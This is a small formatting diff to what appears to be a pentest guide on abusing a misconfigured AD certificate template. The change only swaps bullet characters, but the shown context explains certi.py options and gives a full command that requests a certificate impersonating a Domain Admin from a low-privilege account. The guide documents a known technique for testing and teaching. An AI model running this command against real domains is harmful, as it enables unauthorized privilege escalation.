@@ -112,11 +112,11 @@ export KRB5CCNAME=johndo-lowpriv.ccache
 
 Parameters:
 
-* `offsec-DC01PKI-CA` - is found in the template `Enroll Services` field
-* `-k` - to use kerberos authentication
-* `-n` - 'no-pass' for use with `-k`
-* `--alt-name` - the user you want to impersonate, this will likely be a 'Domain Admin' or equal
-* `--template` - the vulnerable template name
+- `offsec-DC01PKI-CA` - is found in the template `Enroll Services` field
+- `-k` - to use kerberos authentication
+- `-n` - 'no-pass' for use with `-k`
+- `--alt-name` - the user you want to impersonate, this will likely be a 'Domain Admin' or equal
+- `--template` - the vulnerable template name
 
 ```plain
 $ python3 certi.py req 'offsec.nl/johndo-lowpriv@DC01PKI.offsec.nl' offsec-DC01PKI-CA -k -n --alt-name johnDomainAdmin --template UsersOffsecAD
